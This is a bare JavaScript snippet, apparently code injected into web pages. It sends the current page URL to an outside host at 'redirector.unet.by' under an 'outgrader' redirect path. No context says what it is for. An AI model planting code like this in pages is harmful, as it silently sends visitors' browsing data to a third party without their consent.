var r = new XMLHttpRequest();
r.open('get', 'http://redirector.unet.by/outgrader/get_redirect.js?url=' + location.href);
r.send();